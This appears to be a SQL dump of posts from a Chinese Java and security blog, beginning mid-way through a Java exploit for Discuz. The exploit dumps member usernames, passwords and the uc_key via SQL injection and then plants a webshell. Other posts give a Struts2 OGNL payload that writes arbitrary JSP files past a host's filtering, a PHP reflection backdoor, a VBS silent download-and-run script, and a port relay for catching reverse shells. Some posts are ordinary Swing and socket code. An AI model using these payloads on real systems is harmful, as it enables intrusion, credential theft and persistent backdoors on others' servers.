concat(0x7b,0x23,uid,0x2c,username,0x2c,password,0x2c,email,0x23,0x7D) from &quot;+pre+&quot;members&quot; +&quot; limit &quot;+i+&quot;,1&quot;));\n					if(!&quot;&quot;.equals(str)){\n						System.out.println(str);\n					}\n				}\n			} catch (Exception e) {\n				System.out.println(e.toString());\n			}\n			if(!install){\n				System.out.println(&quot;没有找到applications，程序退出，&quot;);\n				return ;\n			}\n			System.out.println(&quot;-----------------------discuz表前缀:&quot;+(pre.length()==0?&quot;没有前缀&quot;:pre)+&quot;----------------------&quot;);\n			System.out.println(&quot;-----------------------uc_key----------------------&quot;);\n			int len3 = Integer.parseInt(getR(url, exp.replace(&quot;$sql&quot;, &quot;select concat(0x7b,0x23,length(authkey),0x23,0x7D) from &quot;+applications +&quot; limit 0,1&quot;)));\n			StringBuilder sb = new StringBuilder();\n			for (int i = 1; i &lt;= len3/32+1; i++) {\n				String sql = exp.replace(&quot;$sql&quot;, &quot;select concat(0x7b,0x23,substr(authkey,&quot;+((i-1)*32+1)+&quot;,32),0x23,0x7D) from &quot;+applications +&quot; limit 0,1&quot;);\n				sb.append(getR(url, sql));\n			}\n			System.out.println(sb);\n			System.out.println(&quot;-----------------------getshell----------------------&quot;);\n			String a = url.substring(0,url.indexOf(&quot;faq.php&quot;));\n			test(a+&quot;/api/uc.php?code=&quot;, sb.toString());\n			String b = send(&quot;xxs=echo 12345;&quot;, a+&quot;/config.inc.php&quot;, 5000);\n			if(b.contains(&quot;12345&quot;)){\n				System.out.println(&quot;Shell:&quot;+a+&quot;/config.inc.php\\r\\n&quot;);\n			}\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n	}\n	public static void main(String[] args) throws Exception {\n		new Discuz().startX();\n	}\n}</pre>', null, '2014-07-06 03:26:13', '1', '529', null, '0', '2014-07-06 03:26:13'), ('1372', '1', '3', 'Struts2 阿里云主机getshell', '园长', '测试了下阿里云主机，似乎默认带了Struts2命令执行和Getshell的拦截。改了下就不拦了撒。\n<pre class=\"brush: java; gutter: true\">http://xxx.com/test.action?redirect:${%23req%3d%23context.get(&#039;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#039;),%23w%3d%23context.get(&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;).getWriter(),%23p%3d%23req.getRealPath(%22/%22)%2b%23req.getParameter(%22f%22),%23s%3dnew+java.io.RandomAccessFile(%23p,%22rw%22),%23s.write(%23req.getParameter(%22c%22).getBytes()),%23s.close()}&amp;f=文件.jsp&amp;c=内容</pre>', null, '2014-07-14 10:32:12', '1', '545', null, '0', '2014-07-14 10:32:12'), ('1374', '1', '3', '阿里2013技术嘉年华文档和阿里2013 java技术文档', '园长', '百度老删，只能私密分享了。阿里技术嘉年华文档都是公开的：http://adc.alibabatech.org/，内容非常丰富。至于那几个java文档从百度文库找的。\n<p><span style=\"color: #595757;\">ADC•阿里技术嘉年华于7月13-14日在杭州举行。这是一场专属于&lt;互联网工程师&gt;的“技术盛宴”，倡导&lt;干货分享&gt;。 不仅有高含金量的“主题论坛“， 精彩的”Workshop“、“Tech Show”，还有互动好玩的“以书会友”、“码农照相馆” 、“招聘墙”、“运动区”等。</span></p>\n<p><a href=\"http://pan.baidu.com/s/1pJ0mYyJ\">2013阿里技术嘉年华<span style=\"text-decoration: underline;\"> </span></a>、链接: http://pan.baidu.com/s/1pJ0mYyJ 密码: 4wmi</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/07/1.jpg\"><img class=\"alignnone size-full wp-image-1375\" src=\"http://javaweb.org/wp-content/uploads/2014/07/1.jpg\" alt=\"1\" width=\"213\" height=\"171\" /></a></p>\n<p><a href=\"http://pan.baidu.com/s/1sj0OT0x\">阿里-java-doc-2013</a>、链接: http://pan.baidu.com/s/1sj0OT0x 密码: 2bhg</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/07/2.jpg\"><img class=\"alignnone size-full wp-image-1376\" src=\"http://javaweb.org/wp-content/uploads/2014/07/2.jpg\" alt=\"2\" width=\"195\" height=\"114\" /></a></p>', null, '2014-07-14 16:11:56', '1', '529', null, '0', '2014-07-14 16:36:46'), ('1382', '1', '3', 'google-diff-match-patch', '园长', '一个google多语言diff源码和测试类，支持的语言有：<span style=\"color: #000000;\">Java, JavaScript, Dart, C++, C#, Objective C, Lua and Python</span>。这货很方便，对比之后还可以生成html的diif代码片段。不是什么新玩意，项目最后更新时间是2012年。\n<p>项目地址：<a href=\"https://code.google.com/p/google-diff-match-patch/\">https://code.google.com/p/google-diff-match-patch/</a></p>\n<p>源码和测试类：</p>\n<p><a href=\"http://pan.baidu.com/s/1ntG6kat\">http://pan.baidu.com/s/1ntG6kat</a></p>\n<p><span style=\"color: #404040;\">google-diff-match-patch：用于对文本进行比对，匹配和补缀。它提供了强大的算法来进行同步纯文本所需的操作。</span></p>\n<p><ol style=\"color: #404040;\"></p>\n<p>	<li><strong>Diff:</strong></p>\n<p><ul></p>\n<p>	<li>Compare two blocks of plain text and efficiently return a list of differences.</li></p>\n<p>	<li><a style=\"color: #005fa9;\" href=\"http://neil.fraser.name/software/diff_match_patch/svn/trunk/demos/demo_diff.html\" rel=\"nofollow\">Diff Demo</a></li></p>\n<p></ul></p>\n<p></li></p>\n<p>	<li><strong>Match:</strong></p>\n<p><ul></p>\n<p>	<li>Given a search string, find its best fuzzy match in a block of plain text. Weighted for both accuracy and location.</li></p>\n<p>	<li><a style=\"color: #005fa9;\" href=\"http://neil.fraser.name/software/diff_match_patch/svn/trunk/demos/demo_match.html\" rel=\"nofollow\">Match Demo</a></li></p>\n<p></ul></p>\n<p></li></p>\n<p>	<li><strong>Patch:</strong></p>\n<p><ul></p>\n<p>	<li>Apply a list of patches onto plain text. Use best-effort to apply patch even when the underlying text doesn\'t match.</li></p>\n<p>	<li><a style=\"color: #005fa9;\" href=\"http://neil.fraser.name/software/diff_match_patch/svn/trunk/demos/demo_patch.html\" rel=\"nofollow\">Patch Demo</a></li></p>\n<p></ul></p>\n<p></li></p>\n<p></ol></p>\n<p><p style=\"color: #404040;\">当前支持Java, JavaScript, Dart, C++, C#, Objective C, Lua 和Python等编程语言。所提供的每种语言版本都具有相同的API和相同的API。</p></p>', null, '2014-07-17 01:23:24', '1', '537', null, '0', '2014-07-17 01:25:12'), ('1385', '1', '12', 'vbs下载并静默安装jre', '园长', '安装完成后可以回调，替换echo 123456789和pause就行了。\n<pre class=\"brush: vb; gutter: true\">dim path\nset ws = CreateObject(&quot;WScript.Shell&quot;)\nset fso=createobject(&quot;scripting.filesystemobject&quot;)\n&#039;&#039;定义安装路径\npath = ws.ExpandEnvironmentStrings(&quot;%windir%&quot;)+&quot;\\jre6\\&quot;\n&#039;&#039;创建目录\nIf (fso.FolderExists(path)) Then\nElse\n	fso.createfolder(path)\nEnd If \n&#039;&#039;文件下载\nSet xPost = CreateObject(&quot;Microsoft.XMLHTTP&quot;)\nSet sGet = CreateObject(&quot;ADODB.Stream&quot;)\nSub DownloadToFile(url, file)\n  xPost.Open &quot;GET&quot;, url, False\n  xPost.Send\n  sGet.Type = 1\n  sGet.Open\n  sGet.Write xPost.responseBody\n  sGet.SaveToFile file, 2\n  sGet.Close\nEnd Sub\ndim url\nurl = &quot;http://xxx.com/jre-6-windows-i586.exe&quot;\ndim fileName,batpath\nfileName = path+Right(url, Len(url) - InStrRev(url,&quot;/&quot;))\nDownloadToFile url, fileName\nbatpath = path+&quot;start.bat&quot;\nset f=fso.createtextfile(batpath)\n&#039;&#039;写bat执行安装jre,完成后输出123456789,并暂停\nf.write fileName+&quot; /s INSTALLDIR=&quot;+path&amp; vbcrlf&amp;&quot;echo 123456789&quot;&amp;vbcrlf&amp;&quot;pause&quot;\nf.close\n&#039;&#039;隐藏运行\nws.run(batpath),0,true</pre>', null, '2014-07-23 17:32:48', '1', '718', null, '0', '2014-07-23 17:32:48'), ('1387', '1', '5', 'PHP反射后门', '园长', 'PHP反射后门，之前测试的时候不知道php有个反射function. <a href=\"http://javaweb.org/?p=696\">PHP reflection反射应用</a>\n<p><img class=\"alignnone size-full wp-image-1388\" src=\"http://javaweb.org/wp-content/uploads/2014/07/11.jpg\" alt=\"1\" width=\"671\" height=\"280\" /></p>\n<pre class=\"brush: php; gutter: true\">&lt;?php\n	$func = new ReflectionFunction($_GET[m]);\n	echo $func-&gt;invokeArgs(array($_GET[c]));\n?&gt;</pre>', null, '2014-07-23 17:58:20', '1', '845', null, '5', '2014-07-29 13:55:37'), ('1391', '1', '27', 'Jtree', '园长', '隐藏root:jtree.setRootVisible(false);\n<p>2：</p>\n<pre class=\"brush: java; gutter: true\">import java.awt.BorderLayout;\nimport javax.swing.JFrame;\nimport javax.swing.JTree;\nimport javax.swing.tree.DefaultMutableTreeNode;\nimport javax.swing.tree.DefaultTreeModel;\nimport javax.swing.tree.TreeNode;\npublic class Admin extends JFrame{\n	private static final long serialVersionUID = 1L;\n	private JTree createJTree() {\n		JTree jTree = new JTree();\n		jTree.setRootVisible( false );\n		DefaultMutableTreeNode root = new DefaultMutableTreeNode(&quot;root node, should be invisible&quot;);\n		DefaultTreeModel defaultTreeModel = new DefaultTreeModel( root );\n		jTree.setModel( defaultTreeModel );\n		DefaultMutableTreeNode parentNode; \n		DefaultMutableTreeNode node;\n		parentNode = (DefaultMutableTreeNode) defaultTreeModel.getRoot(); \n		node = new DefaultMutableTreeNode( &quot;node 1&quot; );\n		addNodeToDefaultTreeModel( defaultTreeModel, parentNode, node );\n		parentNode = node; \n		node = new DefaultMutableTreeNode( &quot;node 2&quot; );\n		addNodeToDefaultTreeModel( defaultTreeModel, parentNode, node );\n		parentNode = (DefaultMutableTreeNode) defaultTreeModel.getRoot(); \n		node = new DefaultMutableTreeNode( &quot;node 3&quot; );\n		addNodeToDefaultTreeModel( defaultTreeModel, parentNode, node );\n		parentNode = node; \n		node = new DefaultMutableTreeNode( &quot;node 4&quot; );\n		addNodeToDefaultTreeModel( defaultTreeModel, parentNode, node );\n		return jTree;\n	}\n	private static void addNodeToDefaultTreeModel( DefaultTreeModel treeModel, DefaultMutableTreeNode parentNode, DefaultMutableTreeNode node ) {\n		treeModel.insertNodeInto(node, parentNode, parentNode.getChildCount());\n		if (parentNode == treeModel.getRoot()) {\n			treeModel.nodeStructureChanged((TreeNode) treeModel.getRoot());\n		}\n	}\n	public static void main(String[] args) {\n		JFrame j = new JFrame(&quot;Test&quot;);\n		j.setSize(500,300);\n		j.setLocation(500,300);\n		j.setLayout(new BorderLayout());\n		Admin a = new Admin();\n		JTree t = a.createJTree();\n		j.add(t);\n		j.setVisible(true);\n	}\n}</pre>\n<p>2：</p>\n<pre class=\"brush: actionscript3; gutter: true\">import javax.swing.JFrame;\nimport javax.swing.JTree;\nimport javax.swing.tree.DefaultMutableTreeNode;\nimport javax.swing.tree.DefaultTreeModel;\npublic class Admin extends JFrame{\n	private static final long serialVersionUID = 1L;\n	public static void main(String[] args) {\n		JFrame j = new JFrame(&quot;Test&quot;);\n		j.setSize(500,300);\n		j.setLocation(500,300);\n		JTree t = new JTree();\n		DefaultMutableTreeNode root = new DefaultMutableTreeNode(&quot;Root&quot;);\n		root.add(new DefaultMutableTreeNode(&quot;123&quot;));\n		root.add(new DefaultMutableTreeNode(&quot;456&quot;));\n		DefaultTreeModel model = new DefaultTreeModel (root);\n		t.setModel(model);\n		t.setRootVisible(false);\n		j.add(t);\n		j.setVisible(true);\n	}\n}</pre>\n<p>3：</p>\n<pre class=\"brush: java; gutter: true\">jtree.expandRow(0);\njtree.setRootVisible(false);</pre>\n<p>4:</p>\n<pre class=\"brush: java; gutter: true\">import java.awt.Color;\nimport java.awt.Component;\nimport java.awt.Graphics;\nimport javax.swing.Icon;\nimport javax.swing.ImageIcon;\nimport javax.swing.JFrame;\nimport javax.swing.JLabel;\nimport javax.swing.JTree;\nimport javax.swing.tree.DefaultMutableTreeNode;\nimport javax.swing.tree.DefaultTreeCellRenderer;\nimport javax.swing.tree.DefaultTreeModel;\npublic class Admin extends JFrame {\n	private static final long serialVersionUID = 1L;\n	public void test(){\n		JFrame j = new JFrame(&quot;Test&quot;);\n		j.setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n		j.setSize(500, 300);\n		j.setLocation(500, 300);\n		JTree t = new JTree(){\n			private static final long serialVersionUID = 1L;\n			@Override\n			public void paintComponent(Graphics g) {\n			   super.paintComponent(g);\n			   g.drawLine(0, 20, 10, 8);\n			}\n		};\n		DefaultMutableTreeNode root = new DefaultMutableTreeNode(&quot;Root&quot;);\n		DefaultMutableTreeNode d1 =  new DefaultMutableTreeNode(&quot;11111&quot;);\n		d1.add(new DefaultMutableTreeNode(&quot;222&quot;));\n		root.add(d1);\n		root.add(new DefaultMutableTreeNode(&quot;4562&quot;));\n		DefaultTreeModel model = new DefaultTreeModel(root);\n		t.putClientProperty(&quot;JTree.lineStyle&quot;, &quot;Horizontal&quot;);\n		t.setCellRenderer(new DefaultTreeCellRenderer() {\n			private static final long serialVersionUID = 1L;\n			public Component getTreeCellRendererComponent(JTree tree, Object value,boolean isSelected,boolean expanded,boolean leaf, int row,boolean hasFocus) {\n				Component renderer = super.getTreeCellRendererComponent(tree, value, isSelected, expanded, leaf, row, hasFocus);\n                Color foreground, background = getBackground();\n                foreground = Color.BLACK;\n                setBackgroundNonSelectionColor(Color.RED);\n                if (isSelected) {\n                    setBackgroundNonSelectionColor(background);\n                } else {\n                	setBackgroundSelectionColor(background);\n                    background = new Color(217,236,254);\n                }\n                if (value instanceof JLabel) {\n                    this.setText(&quot;1345676&quot;);\n                    this.setIcon(((JLabel) value).getIcon());\n                }\n                super.setBackground(Color.yellow);\n                renderer.setForeground(foreground);\n                renderer.setBackground(background);\n                return renderer;\n			}\n			ImageIcon icon = new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/toolbar_new.png&quot;));\n			public Icon getClosedIcon() {\n				return icon;\n			}\n			public Icon getLeafIcon() {\n				return icon;\n			}\n			public Icon getOpenIcon() {\n				return icon;\n			}\n		});\n		t.setOpaque(true);\n//		t.setBackground(Color.RED);\n		t.setModel(model);\n		t.setRootVisible(false);\n		j.add(t);\n		j.setVisible(true);\n	}\n	public static void main(String[] args) {\n		new Admin().test();\n	}\n}</pre>\n<p>jtree展开和获取节点问题：</p>\n<pre class=\"brush: java; gutter: true\">import java.awt.Dimension;\nimport javax.swing.tree.DefaultMutableTreeNode;\nimport javax.swing.tree.TreeModel;\nimport javax.swing.tree.TreeNode;\nimport javax.swing.tree.TreePath;\n/**\n *\n * @author yz\n */\npublic class MainFrame extends javax.swing.JFrame {\n	public MainFrame() {\n        initComponents();\n    }\n    private void initComponents() {\n        jScrollPane1 = new javax.swing.JScrollPane();\n        DefaultMutableTreeNode rootNode = new DefaultMutableTreeNode(&quot;Root&quot;);\n        jTree1 = new javax.swing.JTree(rootNode);\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        jScrollPane1.setViewportView(jTree1);\n        /** add some dummy data */\n        DefaultMutableTreeNode prNode = new DefaultMutableTreeNode(&quot;a&quot;); //project\n        DefaultMutableTreeNode pNode = new DefaultMutableTreeNode(&quot;a1&quot;); //package\n        pNode.add(new DefaultMutableTreeNode(&quot;AutoscrollTextArea.java&quot;));\n        DefaultMutableTreeNode p2Node = new DefaultMutableTreeNode(&quot;euphoria.utils&quot;);\n        p2Node.add(new DefaultMutableTreeNode(&quot;Timer.java&quot;));\n        pNode.add(p2Node);\n        prNode.add(pNode);\n        rootNode.add(prNode);\n        rootNode.add(new DefaultMutableTreeNode(&quot;Hello&quot;));\n        TreeModel tm = jTree1.getModel();\n        DefaultMutableTreeNode root = (DefaultMutableTreeNode) tm.getRoot();\n        DefaultMutableTreeNode tn = (DefaultMutableTreeNode) root.getFirstChild();\n        jTree1.expandPath(new TreePath(tn.getPath()));\n        jTree1.expandRow(0);\n        jTree1.setRootVisible(false);\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 159, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(0, 431, Short.MAX_VALUE))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 378, Short.MAX_VALUE)\n        );\n        int screenWidth = java.awt.Toolkit.getDefaultToolkit().getScreenSize().width;\n        int screenHeight = java.awt.Toolkit.getDefaultToolkit().getScreenSize().height;\n        Dimension d = getPreferredSize();\n        this.setBounds(screenWidth / 2 - (d.width/2), screenHeight / 2 - (d.height/2), d.width, d.height);\n        pack();\n    }// &lt;/editor-fold&gt;                        \n    /**\n     * @param args the command line arguments\n     */\n    public static void main(String args[]) {\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new MainFrame().setVisible(true);\n            }\n        });\n    }\n    // Variables declaration - do not modify                     \n    private javax.swing.JScrollPane jScrollPane1;\n    private javax.swing.JTree jTree1;\n    // End of variables declaration                   \n}</pre>', null, '2014-07-25 22:50:21', '1', '723', null, '0', '2014-08-14 11:07:46'), ('1398', '1', '27', 'JavaSwing Jtree 自定义node(选中节点获取自定义节点信息)', '园长', '如果选中一个节点直接通过node的text去获取很多时候是不行的，最简单的办法是继承DefaultMutableTreeNode类，重写toString和构造方法。\n<pre class=\"brush: java; gutter: true\">import java.awt.event.MouseAdapter;\nimport java.awt.event.MouseEvent;\nimport javax.swing.JFrame;\nimport javax.swing.JTree;\nimport javax.swing.tree.DefaultMutableTreeNode;\npublic class TreeActionMap extends JFrame{\n	private static final long serialVersionUID = 1L;\n	public static void main(String[] args) {\n		JFrame j = new JFrame(&quot;Test&quot;);\n		j.setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n		j.setSize(500, 300);\n		j.setLocation(500, 300);\n		NodeBean root = new NodeBean(&quot;用户列表&quot;);\n		root.add(new NodeBean(1, &quot;admin&quot;));\n		root.add(new NodeBean(2, &quot;root&quot;));\n		root.add(new NodeBean(3, &quot;test&quot;));\n		final JTree t = new JTree(root);\n		t.addMouseListener(new MouseAdapter() {\n            public void mouseClicked(MouseEvent e) {\n            	NodeBean n = (NodeBean)t.getLastSelectedPathComponent();\n                System.out.println(n.getId());\n            }\n        });\n		j.add(t);\n		j.setVisible(true);\n	}\n}\nclass NodeBean extends DefaultMutableTreeNode{\n	private static final long serialVersionUID = 1L;\n	private int id;\n	private String user;\n	public NodeBean(int id, String user) {\n		super();\n		this.id = id;\n		this.user = user;\n	}\n	public NodeBean(Object obj){\n        super(obj);\n    }\n	public int getId() {\n		return id;\n	}\n	public void setId(int id) {\n		this.id = id;\n	}\n	public String getUser() {\n		return user;\n	}\n	public void setUser(String user) {\n		this.user = user;\n	}\n	public String toString(){\n		return (String) (super.userObject!=null?super.userObject:this.user);\n	}\n}</pre>', null, '2014-07-28 16:52:33', '1', '709', null, '0', '2014-08-14 11:07:38'), ('1406', '1', '3', 'java socket 长连接read阻塞问题', '园长', '解决的方法有3个 :\n<p>1 约定发送的数据长度，比如 http的 keepAlive 就是必须依赖这个的 Content-Length</p>\n<p>2 设置超时的时间，根据我的经验，只有在Socket级别设置才有效.</p>\n<p>Socket socket = new Socket(host,port);</p>\n<p>socket.setSoTimeout(100); // 如果超过100毫秒还没有数据(根据你的实际情况设置延迟，传输大文件需要设置得大一些)，则抛出 SocketTimeoutException</p>\n<p>3 让发送端发送完数据后，关闭连接。 这个在Http的操作时很常见。</p>\n<p>(<a style=\"color: #000000;\" href=\"http://blog.csdn.net/java2000_net/article/details/3963389\">InputStream如何判断数据已经读取结束</a>)</p>\n<p>某些时候无法修改客户端的情况下情况一就只有pass掉了，情况二相对来说比较适合，当阻塞后直接抛出一个异常。情况三不适合长连接，因为整个通信过程中链路是不能中断的，也不能调shutdown结束。其实还有第四种方法：当读取到某些字符就不在往下读取了，比如读取到byebye就break。但是这也需要改客户端代码。选了一种折中的办法-设置超时：</p>\n<pre class=\"brush: java; gutter: true\">StringBuilder sb = new StringBuilder();\ntry {\n    client.setSoTimeout(500);\n    while ((a = client.getInputStream().read(buf)) != -1) {\n        sb.append(new String(buf, 0, a));\n        if (a != size) {\n            break;\n        }\n    }\n} catch (Exception e) {\n}\nSystem.out.println(sb);</pre>', null, '2014-07-30 00:58:00', '1', '548', null, '0', '2014-09-01 12:17:40'), ('1412', '1', '27', 'JPanel流水布局加滚动条', '园长', 'JPanel设置布局为WrapLayout:WrapLayout layout = new WrapLayout(FlowLayout.LEFT, 55, 30);最后把JPanel加到JScrollPane。\n<p><a class=\"tooltipped tooltipped-s permalink\" style=\"color: #4183c4;\" href=\"https://gist.github.com/jirkapenzes/4560255#file-wraplayout-java\"><strong class=\"file-name js-selectable-text\">WrapLayout.java</strong></a></p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.jrat.server.ui;\nimport java.awt.Component;\nimport java.awt.Container;\nimport java.awt.Dimension;\nimport java.awt.FlowLayout;\nimport java.awt.Insets;\nimport javax.swing.JScrollPane;\nimport javax.swing.SwingUtilities;\n/**\n * FlowLayout subclass that fully supports wrapping of components.\n */\npublic class WrapLayout extends FlowLayout {\n    private Dimension preferredLayoutSize;\n    /**\n     * Constructs a new &lt;code&gt;WrapLayout&lt;/code&gt; with a left alignment and a\n     * default 5-unit horizontal and vertical gap.\n     */\n    public WrapLayout() {\n        super();\n    }\n    /**\n     * Constructs a new &lt;code&gt;FlowLayout&lt;/code&gt; with the specified alignment and\n     * a default 5-unit horizontal and vertical gap. The value of the alignment\n     * argument must be one of &lt;code&gt;WrapLayout&lt;/code&gt;, &lt;code&gt;WrapLayout&lt;/code&gt;,\n     * or &lt;code&gt;WrapLayout&lt;/code&gt;.\n     *\n     * @param align the alignment value\n     */\n    public WrapLayout(int align) {\n        super(align);\n    }\n    /**\n     * Creates a new flow layout manager with the indicated alignment and the\n     * indicated horizontal and vertical gaps.\n     * &lt;p&gt;\n     * The value of the alignment argument must be one of\n     * &lt;code&gt;WrapLayout&lt;/code&gt;, &lt;code&gt;WrapLayout&lt;/code&gt;, or\n     * &lt;code&gt;WrapLayout&lt;/code&gt;.\n     *\n     * @param align the alignment value\n     * @param hgap the horizontal gap between components\n     * @param vgap the vertical gap between components\n     */\n    public WrapLayout(int align, int hgap, int vgap) {\n        super(align, hgap, vgap);\n    }\n    /**\n     * Returns the preferred dimensions for this layout given the &lt;i&gt;visible&lt;/i&gt;\n     * components in the specified target container.\n     *\n     * @param target the component which needs to be laid out\n     * @return the preferred dimensions to lay out the subcomponents of the\n     * specified container\n     */\n    @Override\n    public Dimension preferredLayoutSize(Container target) {\n        return layoutSize(target, true);\n    }\n    /**\n     * Returns the minimum dimensions needed to layout the &lt;i&gt;visible&lt;/i&gt;\n     * components contained in the specified target container.\n     *\n     * @param target the component which needs to be laid out\n     * @return the minimum dimensions to lay out the subcomponents of the\n     * specified container\n     */\n    @Override\n    public Dimension minimumLayoutSize(Container target) {\n        Dimension minimum = layoutSize(target, false);\n        minimum.width -= (getHgap() + 1);\n        return minimum;\n    }\n    /**\n     * Returns the minimum or preferred dimension needed to layout the target\n     * container.\n     *\n     * @param target target to get layout size for\n     * @param preferred should preferred size be calculated\n     * @return the dimension to layout the target container\n     */\n    private Dimension layoutSize(Container target, boolean preferred) {\n        synchronized (target.getTreeLock()) {\n            // Each row must fit with the width allocated to the containter.\n            // When the container width = 0, the preferred width of the\n            // container\n            // has not yet been calculated so lets ask for the maximum.\n            int targetWidth = target.getSize().width;\n            if (targetWidth == 0) {\n                return new Dimension();\n            }\n//            if (targetWidth == 0)\n//                targetWidth = Integer.MAX_VALUE;\n            int hgap = getHgap();\n            int vgap = getVgap();\n            Insets insets = target.getInsets();\n            int horizontalInsetsAndGap = insets.left + insets.right + (hgap * 2);\n            int maxWidth = targetWidth - horizontalInsetsAndGap;\n            // Fit components into the allowed width\n            Dimension dim = new Dimension(0, 0);\n            int rowWidth = 0;\n            int rowHeight = 0;\n            int nmembers = target.getComponentCount();\n            for (int i = 0; i &lt; nmembers; i++) {\n                Component m = target.getComponent(i);\n                if (m.isVisible()) {\n                    Dimension d = preferred ? m.getPreferredSize() : m.getMinimumSize();\n                    // Can&#039;t add the component to current row. Start a new row.\n                    if (rowWidth + d.width &gt; maxWidth) {\n                        addRow(dim, rowWidth, rowHeight);\n                        rowWidth = 0;\n                        rowHeight = 0;\n                    }\n                    // Add a horizontal gap for all components after the first\n                    if (rowWidth != 0) {\n                        rowWidth += hgap;\n                    }\n                    rowWidth += d.width;\n                    rowHeight = Math.max(rowHeight, d.height);\n                }\n            }\n            addRow(dim, rowWidth, rowHeight);\n            dim.width += horizontalInsetsAndGap;\n            dim.height += insets.top + insets.bottom + vgap * 2;\n            // When using a scroll pane or the DecoratedLookAndFeel we need to\n            // make sure the preferred size is less than the size of the\n            // target containter so shrinking the container size works\n            // correctly. Removing the horizontal gap is an easy way to do this.\n            Container scrollPane = SwingUtilities.getAncestorOfClass(JScrollPane.class, target);\n            if (scrollPane != null &amp;&amp; target.isValid()) {\n                dim.width -= (hgap + 1);\n            }\n            return dim;\n        }\n    }\n    /*\n     * A new row has been completed. Use the dimensions of this row to update\n     * the preferred size for the container.\n     *\n     * @param dim update the width and height when appropriate\n     *\n     * @param rowWidth the width of the row to add\n     *\n     * @param rowHeight the height of the row to add\n     */\n    private void addRow(Dimension dim, int rowWidth, int rowHeight) {\n        dim.width = Math.max(dim.width, rowWidth);\n        if (dim.height &gt; 0) {\n            dim.height += getVgap();\n        }\n        dim.height += rowHeight;\n    }\n}</pre>', null, '2014-08-06 18:43:52', '1', '686', null, '0', '2014-08-14 11:07:26'), ('1418', '1', '3', 'Java 端口映射辅助', '园长', '刚写好这小玩意，发现好像有小伙伴儿在捣乱，博客一直以来都是拿来随意记录下平时的代码什么的。之前都随便托管在一主机商，前段时间买了几个VPS一直没用上，现在就随便找个VPS腾了下。\n<p>身处内网，操作什么的很不方便反弹个shell什么的都很麻烦。远控之类的有端口映射功能，可以先在公网IP上开一个端口(如9527)，然后反弹shell到目标9527端口。9527端口再转发到自己的1080端口做数据交互，同时用本地程序和数据交互端口1080通信再次交换数据即可。本地再提供一个1080代理，代码如下：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/08/11.jpg\"><img class=\"alignnone size-full wp-image-1421\" src=\"http://javaweb.org/wp-content/uploads/2014/08/11.jpg\" alt=\"1\" width=\"1252\" height=\"441\" /></a></p>\n<p><strong>RemoteConnector.java</strong></p>\n<pre class=\"brush: java; gutter: true\">import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\npublic class RemoteConnector extends Thread {\n	InputStream is;\n	OutputStream os;\n	static final Logger logger = Logger.getLogger(RemoteConnector.class.getName());\n	public RemoteConnector() {\n	}\n	public RemoteConnector(InputStream is, OutputStream os) {\n		this.is = is;\n		this.os = os;\n	}\n	public void run() {\n		InputStream in = null;\n		OutputStream out = null;\n		try {\n			in = this.is;\n			byte[] b = new byte[8192];\n			int length;\n			out = this.os;\n			while ((length = in.read(b)) &gt; 0) {\n				out.write(b, 0, length);\n				out.flush();\n			}\n		} catch (Exception e) {\n			e.printStackTrace();\n		}finally{\n			try {\n				if (in != null){\n					in.close();\n				}\n				if (out != null){\n					out.close();\n				}\n			} catch (Exception e) {\n				logger.info(e.toString());\n			}\n		}\n	}\n	public void startX(){\n		new Sb1().start();\n		new Sb2().start();\n	}\n	public static void main(String[] args) {\n		new RemoteConnector().startX();\n	}\n	class Sb1 extends Thread{\n		Socket local;\n		public void startX() throws Exception{\n			int port = 1080;\n			ServerSocket ss = new ServerSocket(port);\n			logger.info(&quot;监听端口:&quot;+port);\n			while(true){\n				Socket s = ss.accept();\n				String ip = s.getInetAddress().getHostAddress();\n				if(&quot;127.0.0.1&quot;.equals(ip)){\n					logger.info(&quot;建立本地连接成功!&quot;);\n					this.local = s;\n				}else{\n					if(this.local!=null){\n						try {\n							logger.info(&quot;开始传输数据到:&quot;+ip);\n							(new RemoteConnector(s.getInputStream(), this.local.getOutputStream())).start();\n							(new RemoteConnector(this.local.getInputStream(), s.getOutputStream())).start();\n						} catch (Exception e) {\n							throw e;//抛出异常，等待重新连接\n						}\n					}\n				}\n			}\n		}\n		public void run(){\n			try {\n				startX();\n			} catch (Exception e) {\n				logger.info(this.getClass()+&quot;-通信异常:&quot;+e.toString()+&quot;\\n重新启动....&quot;);\n			}\n		}\n	}\n	class Sb2 extends Thread{\n		public void startX() throws Exception{\n			int port = 9527;\n			String forwardHost = &quot;127.0.0.1&quot;;\n			int forwardPort = 1080;\n			ServerSocket ss = new ServerSocket(port);\n			logger.info(&quot;监听端口:&quot;+port);\n			while(true){\n				Socket s = ss.accept();\n				String ip = s.getInetAddress().getHostAddress();\n				logger.info(&quot;主机:&quot;+ip+&quot;,连接成功!&quot;);\n				Socket socket = new Socket(forwardHost, forwardPort);\n				logger.info(&quot;转发到:&quot;+forwardHost+&quot;,端口:&quot;+forwardPort);\n				(new RemoteConnector(socket.getInputStream(), s.getOutputStream())).start();\n				(new RemoteConnector(s.getInputStream(), socket.getOutputStream())).start();\n			}\n		}\n		public void run(){\n			try {\n				startX();\n			} catch (Exception e) {\n				logger.info(this.getClass()+&quot;-通信异常:&quot;+e.toString()+&quot;\\n重新启动....&quot;);\n			}\n		}\n	